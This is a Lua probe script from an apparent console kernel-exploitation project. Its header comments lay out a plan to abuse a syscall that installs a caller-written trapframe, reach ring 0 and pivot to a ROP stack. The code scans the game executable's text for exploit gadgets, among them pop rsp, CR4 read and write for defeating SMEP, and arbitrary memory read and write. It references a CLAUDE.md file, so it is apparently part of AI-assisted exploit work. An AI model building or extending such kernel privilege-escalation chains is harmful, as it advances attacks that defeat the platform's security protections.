-- CRASH_CLASS: LOW (reads the game's own RX text only; no kernel access, no 417)
-- PROBE 1360a: inventory the eboot text for the gadgets a ring-0 landing needs
--
-- 1359a proved that syscall 417 installs a caller-written trapframe verbatim:
-- with RIP patched to 0x10000 the loader's SIGSEGV handler dumped a frame whose
-- RIP was 0x10000, CS 0x43, SS 0x3B (results/phase35_dead_end_reruns/
-- 1359a_sys417_frame_ride_20261109_113019.txt). 1358a then patched only CS to
-- the ring-0 code selector 0x08 and the thread stopped emitting.
--
-- A same-CPL iretq pops RIP, CS and RFLAGS only, so at CPL0 the stack pointer is
-- still the kernel stack. The one gadget that converts that into control is
-- `pop rsp; ret` (the qword it pops is tf_rsp, i.e. a value we choose), which
-- pivots to a user ROP stack. Every gadget in that chain has to live in a page
-- that is already executable for this process - our own mmap buffers are NX
-- (424a-424c measured that no prot this process can request executes) - so the
-- only readable and executable pool is eboot's RX text.
--
-- The 13.60 dump shows SMEP is enabled by the kernel (mov cr4 with 0x20000 at
-- 0x8dd182, guarded by a cpuid-derived variable at 0x81de8e) and SMAP is never
-- enabled (no CR4 write sets 0x200000 anywhere in kernel_text.bin). If SMEP is
-- on, a ring-0 landing must be kernel text and this pool is unusable; if it is
-- off, this inventory is the whole remaining requirement. This probe collects
-- the inventory plus every cpuid site, so the CPU-visibility of SMEP can be
-- measured from userland afterwards without touching the kernel.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt
--   results/phase35_dead_end_reruns/1358a_sys417_selectors_20261109_112355.txt
--   probes/phase14_kernel_read/1403h_gadget_scan_fast.lua (read_buffer chunk scan)
--   probes/phase17_new_vectors/106a_sigreturn_srop.lua:80-95 (593 eboot base)
--   results/phase17_new_vectors/424a_mmap_exec_20261022_232204.txt (no prot executes)
--   CLAUDE.md "eboot gadget catalog (rax=N)" / "Child thread ROP syscalls"

print("=== PROBE 1360a: EBOOT GADGET INVENTORY ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return N(v) end
    return nil
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local eb_size = rd(N(info) + 0x110) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local EBN = N(eboot)

print(string.format("[0] eboot text base = 0x%X%08X  size=0x%X  pid=%d",
    eb_hi, eb_lo, eb_size, N(mk(20)())))

if not memory.read_buffer then
    print("[!] no memory.read_buffer - aborting")
    return
end

local PATS = {
    { name = "pop rsp; ret",        p = "\x5C\xC3",           want = 6 },
    { name = "pop rax; ret",        p = "\x58\xC3",           want = 3 },
    { name = "pop rdi; ret",        p = "\x5F\xC3",           want = 3 },
    { name = "pop rsi; ret",        p = "\x5E\xC3",           want = 3 },
    { name = "pop rdx; ret",        p = "\x5A\xC3",           want = 3 },
    { name = "mov rax,cr4; ret",    p = "\x0F\x20\xE0\xC3",   want = 4 },
    { name = "mov cr4,rax; ret",    p = "\x0F\x22\xE0\xC3",   want = 4 },
    { name = "mov [rdi],rax; ret",  p = "\x48\x89\x07\xC3",   want = 4 },
    { name = "mov rax,[rdi]; ret",  p = "\x48\x8B\x07\xC3",   want = 4 },
    { name = "mov [rsi],rax; ret",  p = "\x48\x89\x06\xC3",   want = 4 },
    { name = "mov rax,[rsi]; ret",  p = "\x48\x8B\x06\xC3",   want = 4 },
    { name = "cpuid; ret",          p = "\x0F\xA2\xC3",       want = 4 },
    { name = "cpuid",               p = "\x0F\xA2",           want = 12 },
    { name = "mov eax,ebx; ret",    p = "\x89\xD8\xC3",       want = 4 },
    { name = "mov rax,rbx; ret",    p = "\x48\x89\xD8\xC3",   want = 4 },
    { name = "mov [rdi],rbx; ret",  p = "\x48\x89\x1F\xC3",   want = 4 },
    { name = "iretq",               p = "\xCF",               want = 0 },
}

local hits = {}
for i = 1, #PATS do hits[i] = {} end
local counts = {}
local cpuid_tail = {}

local CHUNK = 0x10000
local OVERLAP = 16
local MAX_OFF = 0x800000
local read_fail = nil
local scanned = 0

local off = 0
while off < MAX_OFF do
    local want = CHUNK
    local ok, s = pcall(function() return memory.read_buffer(uint64(EBN + off), uint64(want)) end)
    if not ok or type(s) ~= "string" or #s < 64 then
        read_fail = off
        break
    end
    scanned = scanned + #s
    for i = 1, #PATS do
        local pat = PATS[i].p
        local cap = PATS[i].want
        local init = 1
        while true do
            local a, bz = string.find(s, pat, init, true)
            if not a then break end
            local abs = off + a - 1
            counts[i] = (counts[i] or 0) + 1
            if cap > 0 and #hits[i] < cap then
                hits[i][#hits[i] + 1] = abs
            end
            if PATS[i].name == "cpuid" and #cpuid_tail < 12 then
                local tail = string.sub(s, a, a + 15)
                cpuid_tail[#cpuid_tail + 1] = { off = abs, hex = tail }
            end
            if cap == 0 and counts[i] > 400 then break end
            init = bz + 1
            if init > #s then break end
        end
    end
    off = off + #s - OVERLAP
end

print(string.format("[1] scanned 0x%X bytes, stopped at 0x%X%s", scanned, off,
    read_fail and " (read failed)" or " (cap reached)"))
print("")

for i = 1, #PATS do
    local n = counts[i] or 0
    print(string.format("[%s] count=%d", PATS[i].name, n))
    for k = 1, #hits[i] do
        local o = hits[i][k]
        print(string.format("    eboot+0x%X   abs=0x%X", o, EBN + o))
    end
end

print("")
print("[cpuid sites]")
for k = 1, #cpuid_tail do
    local bytes = {}
    for j = 1, #cpuid_tail[k].hex do
        bytes[#bytes + 1] = string.format("%02X", string.byte(cpuid_tail[k].hex, j))
    end
    print(string.format("    eboot+0x%X  %s", cpuid_tail[k].off, table.concat(bytes, " ")))
end

print("")
print("[Z] pid=" .. N(mk(20)()))
print("=== PROBE 1360a COMPLETE ===")
